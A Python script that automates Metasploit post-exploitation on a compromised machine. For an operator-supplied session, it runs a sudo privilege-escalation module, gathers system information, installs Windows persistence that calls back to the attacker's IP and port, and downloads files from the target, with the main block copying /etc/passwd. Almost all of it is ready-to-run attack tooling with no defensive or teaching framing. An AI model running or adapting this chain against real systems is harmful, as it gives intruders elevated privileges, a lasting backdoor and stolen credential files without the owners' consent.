import subprocess
import os

def run_privilege_escalation(session_id):
    print(f"Attempting privilege escalation in session {session_id}...")
    privilege_escalation_command = f"""
    use post/multi/escalate/sudo
    set SESSION {session_id}
    set TARGET 0
    run
    """
    return run_msf_post_exploitation(privilege_escalation_command)

def gather_system_info(session_id):
    print(f"Gathering system information for session {session_id}...")
    system_info_command = f"""
    use post/multi/gather/enum_system
    set SESSION {session_id}
    run
    """
    return run_msf_post_exploitation(system_info_command)

def establish_persistence(session_id, local_ip, local_port):
    print(f"Setting up persistence in session {session_id}...")
    persistence_command = f"""
    use exploit/windows/local/persistence
    set SESSION {session_id}
    set LHOST {local_ip}
    set LPORT {local_port}
    run
    """
    return run_msf_post_exploitation(persistence_command)

def download_file(session_id, remote_path, local_path):
    print(f"Downloading file from {remote_path} to {local_path} in session {session_id}...")
    download_command = f"""
    use post/multi/manage/download
    set SESSION {session_id}
    set REMOTE_PATH {remote_path}
    set LOCAL_PATH {local_path}
    run
    """
    return run_msf_post_exploitation(download_command)

def run_msf_post_exploitation(command):
    # Write the post-exploitation command to a resource file
    with open('post_exploitation.rc', 'w') as f:
        f.write(command)

    try:
        # Execute the Metasploit resource script using msfconsole
        result = subprocess.run(
            ['msfconsole', '-r', 'post_exploitation.rc'],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=600
        )
        print("Post-exploitation output:\n", result.stdout)
        print("Errors:\n", result.stderr)

        return result.stdout

    except subprocess.TimeoutExpired:
        print("Post-exploitation module timed out.")
        return None
    except Exception as e:
        print(f"An error occurred: {e}")
        return None
    finally:
        # Clean up the resource file
        os.remove('post_exploitation.rc')

if __name__ == "__main__":
    session_id = input("Enter the session ID to perform post-exploitation: ")
    local_ip = input("Enter your local IP address: ")
    local_port = input("Enter the local port for persistence: ")

    # Example post-exploitation actions
    run_privilege_escalation(session_id)
    gather_system_info(session_id)
    establish_persistence(session_id, local_ip, local_port)
    download_file(session_id, "/etc/passwd", "downloaded_passwd.txt")
